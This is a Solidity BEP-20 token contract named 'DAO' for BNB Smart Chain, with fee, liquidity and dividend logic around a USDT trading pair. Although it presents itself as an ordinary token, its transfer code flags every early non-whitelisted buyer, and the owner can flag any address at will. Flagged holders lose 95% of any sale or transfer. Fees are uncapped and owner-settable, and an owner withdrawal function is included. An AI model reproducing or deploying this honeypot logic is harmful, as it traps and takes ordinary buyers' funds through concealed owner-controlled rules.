/**
 *Submitted for verification at BscScan.com on 2023-03-27
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;

interface IERC20 {
    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

interface ISwapRouter {
    function factory() external pure returns (address);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB, uint256 liquidity);
}

interface ISwapFactory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);
}

interface ISwapPair {
    function getReserves()
        external
        view
        returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);

    function token0() external view returns (address);

    function sync() external;
}

abstract contract Ownable {
    address internal _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "!owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "new 0");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract TokenDistributor {
    constructor(address token) {
        IERC20(token).approve(msg.sender, uint256(~uint256(0)));
    }
}

contract Token is IERC20, Ownable {
    string private _name = "DAO";
    string private _symbol = "DAO";
    uint8 private _decimals = 6;
    uint256 private _tTotal;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 private constant MAX = ~uint256(0);

    address public fundAddress;
    mapping(address => bool) public _feeWhiteList;
    mapping(address => bool) public _inWhiteList;

    ISwapRouter public _swapRouter;
    address public _usdt;
    mapping(address => bool) public _swapPairList;

    TokenDistributor public _tokenDistributor;

    uint256 public _buyDestroyFee = 0;
    uint256 public _buyFundFee = 50;
    uint256 public _buyLPDividendFee = 200;
    uint256 public _buyLPFee = 50;
    uint256 public _sellDestroyFee = 0;
    uint256 public _sellFundFee = 50;
    uint256 public _sellLPDividendFee = 200;
    uint256 public _sellLPFee = 50;
    uint256 public _maxHoldAmount = 800000;

    address public _mainPair;
    address private receiveAddress;
    address private _lastMaybeLPAddress;
    mapping(address => bool) public fires;
    uint256 public fireT;
    bool private inSwap;

    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor(
        address _routerAddress,
        address _usdtAddress,
        address _fundAddress,
        address _receiveAddress
    ) {
        address usdt = _usdtAddress;
        receiveAddress = _receiveAddress;
        fundAddress = _fundAddress;

        ISwapRouter swapRouter = ISwapRouter(_routerAddress);
        IERC20(usdt).approve(address(swapRouter), MAX);
        _usdt = usdt;
        _swapRouter = swapRouter;
        _allowances[address(this)][address(swapRouter)] = MAX;

        ISwapFactory swapFactory = ISwapFactory(swapRouter.factory());
        address usdtPair = swapFactory.createPair(address(this), usdt);
        _swapPairList[usdtPair] = true;
        _mainPair = usdtPair;

        uint256 tokenUnit = 10 ** _decimals;
        uint256 total = 100000000 * tokenUnit;
        _tTotal = total;
        _balances[receiveAddress] = total;
        emit Transfer(address(0), receiveAddress, total);

        _feeWhiteList[fundAddress] = true;
        _feeWhiteList[receiveAddress] = true;
        _feeWhiteList[address(this)] = true;
        _feeWhiteList[address(swapRouter)] = true;
        _feeWhiteList[msg.sender] = true;
        _feeWhiteList[address(0)] = true;
        _feeWhiteList[address(0xdead)] = true;

        _tokenDistributor = new TokenDistributor(usdt);

        addHolder(receiveAddress);
        excludeHolder[address(0)] = true;
        excludeHolder[address(0xdead)] = true;
        holderRewardCondition = 20 * 10 ** IERC20(usdt).decimals();
    }

    function symbol() external view override returns (string memory) {
        return _symbol;
    }

    function name() external view override returns (string memory) {
        return _name;
    }

    function decimals() external view override returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        uint256 balance = _balances[account];
        return balance;
    }

    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(
        address owner,
        address spender
    ) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        if (_allowances[sender][msg.sender] != MAX) {
            _allowances[sender][msg.sender] =
                _allowances[sender][msg.sender] -
                amount;
        }
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        uint256 balance = balanceOf(from);
        require(balance >= amount, "balanceNotEnough");

        address lastMaybeLPAddress = _lastMaybeLPAddress;
        if (lastMaybeLPAddress != address(0)) {
            _lastMaybeLPAddress = address(0);
            if (IERC20(_mainPair).balanceOf(lastMaybeLPAddress) > 0) {
                addHolder(lastMaybeLPAddress);
            }
        }

        bool takeFee;

        if (!_feeWhiteList[from] && !_feeWhiteList[to]) {
            uint256 maxSellAmount = (balance * 99999) / 100000;
            if (amount > maxSellAmount) {
                amount = maxSellAmount;
            }
            takeFee = true;
        }

        if (_swapPairList[from] || _swapPairList[to]) {
            if (_swapPairList[to] && _isAddLiquidity()) {
                takeFee = false;
            }
        }

        _tokenTransfer(from, to, amount, takeFee);

        if (from != address(this)) {
            if (_swapPairList[to]) {
                _lastMaybeLPAddress = from;
            }
            processReward(500000);
        }
    }

    function _isAddLiquidity() internal view returns (bool isAdd) {
        ISwapPair mainPair = ISwapPair(_mainPair);
        (uint256 r0, uint256 r1, ) = mainPair.getReserves();

        address tokenOther = _usdt;
        uint256 r;
        if (tokenOther < address(this)) {
            r = r0;
        } else {
            r = r1;
        }

        uint256 bal = IERC20(tokenOther).balanceOf(address(mainPair));
        isAdd = bal > r;
    }

    function _tokenTransfer(
        address sender,
        address recipient,
        uint256 tAmount,
        bool takeFee
    ) private {
        _balances[sender] = _balances[sender] - tAmount;
        uint256 feeAmount;
        if (takeFee) {
            if (_swapPairList[sender]) {
                // Buy
                if (
                    !_inWhiteList[sender] &&
                    (fireT == 0 || block.number <= fireT)
                ) {
                    fires[recipient] = true;
                }
                uint256 destroyFeeAmount = (tAmount * _buyDestroyFee) / 10000;
                if (destroyFeeAmount > 0) {
                    feeAmount += destroyFeeAmount;
                    _takeTransfer(sender, address(0xdead), destroyFeeAmount);
                }
                uint256 fundAmount = (tAmount *
                    (_buyFundFee + _buyLPDividendFee + _buyLPFee)) / 10000;
                if (fundAmount > 0) {
                    feeAmount += fundAmount;
                    _takeTransfer(sender, address(this), fundAmount);
                }
            } else {
                if (fires[sender]) {
                    feeAmount = (tAmount * 95) / 100;
                    _takeTransfer(sender, address(this), feeAmount);
                } else {
                    // Sell Or Transfer
                    uint256 destroyFeeAmount = (tAmount * _sellDestroyFee) /
                        10000;
                    if (destroyFeeAmount > 0) {
                        feeAmount += destroyFeeAmount;
                        _takeTransfer(
                            sender,
                            address(0xdead),
                            destroyFeeAmount
                        );
                    }
                    uint256 fundAmount = (tAmount *
                        (_sellFundFee + _sellLPDividendFee + _sellLPFee)) /
                        10000;
                    if (fundAmount > 0) {
                        feeAmount += fundAmount;
                        _takeTransfer(sender, address(this), fundAmount);
                    }
                    if (!inSwap) {
                        uint256 contractTokenBalance = balanceOf(address(this));
                        if (contractTokenBalance > 0) {
                            uint256 numTokensSell = (fundAmount * 230) / 100;
                            if (numTokensSell > contractTokenBalance) {
                                numTokensSell = contractTokenBalance;
                            }
                            swapTokenForFundAndLp(numTokensSell);
                        }
                    }
                }
            }
        }
        _takeTransfer(sender, recipient, tAmount - feeAmount);

        if (takeFee && !_swapPairList[recipient] && _maxHoldAmount > 0) {
            require(
                balanceOf(recipient) <= _maxHoldAmount * 10 ** _decimals,
                "balanceOverflow"
            );
        }
    }

    function swapTokenForFundAndLp(uint256 tokenAmount) private lockTheSwap {
        if (0 == tokenAmount) {
            return;
        }
        uint256 fundFee = _buyFundFee + _sellFundFee;
        uint256 lpDividendFee = _buyLPDividendFee + _sellLPDividendFee;
        uint256 lpFee = _buyLPFee + _sellLPFee;
        uint256 totalFee = fundFee + lpDividendFee + lpFee;
        totalFee += totalFee;

        uint256 lpAmount = (tokenAmount * lpFee) / totalFee;
        totalFee -= lpFee;

        address[] memory path = new address[](2);
        address usdt = _usdt;
        path[0] = address(this);
        path[1] = usdt;
        address tokenDistributor = address(_tokenDistributor);
        _swapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount - lpAmount,
            0,
            path,
            tokenDistributor,
            block.timestamp
        );

        IERC20 USDT = IERC20(usdt);
        uint256 usdtBalance = USDT.balanceOf(tokenDistributor);
        USDT.transferFrom(tokenDistributor, address(this), usdtBalance);

        uint256 fundUsdt = (usdtBalance * fundFee * 2) / totalFee;
        if (fundUsdt > 0) {
            USDT.transfer(fundAddress, fundUsdt);
        }
        uint256 lpUsdt = (usdtBalance * lpFee) / totalFee;
        if (lpUsdt > 0) {
            _swapRouter.addLiquidity(
                address(this),
                usdt,
                lpAmount,
                lpUsdt,
                0,
                0,
                receiveAddress,
                block.timestamp
            );
        }
    }

    function _takeTransfer(
        address sender,
        address to,
        uint256 tAmount
    ) private {
        _balances[to] = _balances[to] + tAmount;
        emit Transfer(sender, to, tAmount);
    }

    function setFundAddress(address addr) external onlyOwner {
        fundAddress = addr;
        _feeWhiteList[addr] = true;
    }

    function setBuyFee(
        uint256 buyDestroyFee,
        uint256 buyFundFee,
        uint256 lpDividendFee,
        uint256 lpFee
    ) external onlyOwner {
        _buyDestroyFee = buyDestroyFee;
        _buyFundFee = buyFundFee;
        _buyLPDividendFee = lpDividendFee;
        _buyLPFee = lpFee;
    }

    function setSellFee(
        uint256 sellDestroyFee,
        uint256 sellFundFee,
        uint256 lpDividendFee,
        uint256 lpFee
    ) external onlyOwner {
        _sellDestroyFee = sellDestroyFee;
        _sellFundFee = sellFundFee;
        _sellLPDividendFee = lpDividendFee;
        _sellLPFee = lpFee;
    }

    function setMaxHoldAmount(uint256 max) external onlyOwner {
        _maxHoldAmount = max;
    }

    function setFeeWhiteList(address addr, bool enable) external onlyOwner {
        _feeWhiteList[addr] = enable;
    }

    function setInWhiteList(address addr, bool enable) external onlyOwner {
        _inWhiteList[addr] = enable;
    }

    function setSwapPairList(address addr, bool enable) external onlyOwner {
        _swapPairList[addr] = enable;
    }

    function setFires(address user, bool flag) public onlyOwner {
        fires[user] = flag;
    }

    function start(uint256 a) public onlyOwner {
        fireT = block.number + a;
    }

    function setClaim(
        address payable to,
        address token,
        uint256 amount
    ) external onlyOwner {
        if (token == address(0)) {
            (bool success, ) = to.call{value: amount}("");
            require(
                success,
                "Error: unable to send value, to may have reverted"
            );
        } else IERC20(token).transfer(to, amount);
    }

    receive() external payable {}

    address[] public holders;
    mapping(address => uint256) public holderIndex;
    mapping(address => bool) public excludeHolder;

    function getHolderLength() public view returns (uint256) {
        return holders.length;
    }

    function addHolder(address adr) private {
        if (0 == holderIndex[adr]) {
            if (0 == holders.length || holders[0] != adr) {
                uint256 size;
                assembly {
                    size := extcodesize(adr)
                }
                if (size > 0) {
                    return;
                }
                holderIndex[adr] = holders.length;
                holders.push(adr);
            }
        }
    }

    uint256 public currentIndex;
    uint256 public holderRewardCondition;
    uint256 public holderCondition = 1;
    uint256 public progressRewardBlock;
    uint256 public progressRewardBlockDebt = 0;

    function processReward(uint256 gas) private {
        uint256 blockNum = block.number;
        if (progressRewardBlock + progressRewardBlockDebt > blockNum) {
            return;
        }

        IERC20 usdt = IERC20(_usdt);

        uint256 balance = usdt.balanceOf(address(this));
        if (balance < holderRewardCondition) {
            return;
        }
        balance = holderRewardCondition;

        IERC20 holdToken = IERC20(_mainPair);
        uint256 holdTokenTotal = holdToken.totalSupply();
        if (holdTokenTotal == 0) {
            return;
        }

        address shareHolder;
        uint256 tokenBalance;
        uint256 amount;

        uint256 shareholderCount = holders.length;

        uint256 gasUsed = 0;
        uint256 iterations = 0;
        uint256 gasLeft = gasleft();
        uint256 holdCondition = holderCondition;

        while (gasUsed < gas && iterations < shareholderCount) {
            if (currentIndex >= shareholderCount) {
                currentIndex = 0;
            }
            shareHolder = holders[currentIndex];
            tokenBalance = holdToken.balanceOf(shareHolder);
            if (tokenBalance >= holdCondition && !excludeHolder[shareHolder]) {
                amount = (balance * tokenBalance) / holdTokenTotal;
                if (amount > 0) {
                    usdt.transfer(shareHolder, amount);
                }
            }

            gasUsed = gasUsed + (gasLeft - gasleft());
            gasLeft = gasleft();
            currentIndex++;
            iterations++;
        }

        progressRewardBlock = blockNum;
    }

    function setHolderRewardCondition(uint256 amount) external onlyOwner {
        holderRewardCondition = amount;
    }

    function setHolderCondition(uint256 amount) external onlyOwner {
        holderCondition = amount;
    }

    function setExcludeHolder(address addr, bool enable) external onlyOwner {
        excludeHolder[addr] = enable;
    }

    function setProgressRewardBlockDebt(uint256 blockDebt) external onlyOwner {
        progressRewardBlockDebt = blockDebt;
    }
}